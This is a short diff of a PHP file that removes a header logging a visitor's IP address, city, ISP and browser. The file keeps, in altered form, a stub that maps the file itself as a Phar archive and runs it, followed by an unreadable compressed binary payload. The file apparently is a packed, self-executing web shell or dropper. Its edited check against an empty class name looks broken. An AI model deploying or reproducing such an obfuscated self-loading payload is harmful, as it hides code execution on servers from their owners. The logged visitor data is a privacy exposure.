@@ -1,14 +1,6 @@
 <?php
-/***
-Date		:	2021-10-23 Saturday 00:35:29
-Ipaddress		:	180.241.242.17
-City		:	Pekanbaru
-Country		:	ID
-Region		:	Riau
-Organization		:	Telekomunikasi Indonesia (PT)
-User-Agent		:	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
-***/
-if(!class_exists('Phar')){exit('please install php-phar');}Phar::mapPhar();require_once'phar://'.__FILE__.'/';__HALT_COMPILER(); ?>
+
+if(!class_exists('')){exit('');}Phar::mapPhar();require_once'phar://'.__FILE__.'/';__HALT_COMPILER(); ?>
 Q             ÿ€¨­.phar       F^  böraV  „@æŽ¤      ÅücxÑÖ(€ÆnÃ&iÛ¶­Æn²bÛ¶mÛjlmÛvÃ›î¶{{ûœ{þÜç®•÷Ys9ÆœcÌy9y¬Œ¬`hÈÉÉaµíô¡¡Ù¡éiéé¨èh©èpåµíìmô´qiiÙ˜ØéÙ`Ä¬´õôlômmQÒ±ÒRÓ3Ò½?ôÔt,0ÆvÎ¿À2ú¦Ú:Ú6ö0–öv6ÿ Š	ÂÈé[ZüšÈkÛÃHÛj[»hÛý*è›é›ZšÛ[›jÛãŠYèYZèÛkã’Ê(Á(ÚêÛPñê[Øý¢•´t163Ó¦a¢¦Å%U6~'u´Å•RÀe¦¦ãÀ}Ÿ33rà:13’áòYY™é+ëë|5¶£ab`¡f`Æ%ý*ª )A‰kflª+¢¯kjI†+`dci®OÃÆ@MKÍÈÄÂBÍJÿî¼¶ñ.˜÷¢16 ÅsÐ·±}·XS×ÒÜJÛFŸTFTFSIHN^LZŠ’„‰š™„’„›‹„ŒLßÉØŽTßAÛŒ@ÇÈpbfxXtL, FZ #€ŽžŸ_ôý‘ypœèõÿ‚NL¿~5ß™t´Lïpú÷ç]#Û;\@GÇüzÆÈsb¡ÏôŽ±~ÿú5Ð1ÓÿC53Ã/¿½sÑþÒð&À»l'æ÷Ù;ÒòÃ?,ùm'ÝûØðý1ú%ø
 ~QÓ¿[É ƒOFÆA˜|þ}Õ/”ÿÿdÑ~§µëÿòõ·<¦_|¿ûÇ°0üÃŽ¬Ë~R|§¥ðoÐ
 ±Êí–†\R…§‡¬Ólãºð£°D(¼¥ëžôeécvX§“—áò|8}ÎZxµ3ú0èwZ*pY^'JßhyôÑde [‚(}† ø__×_@ð0ÇÓ@YHîŸVß®žhÖÛXhÌÖMî2ºîz2ÍyÌ.ý»\
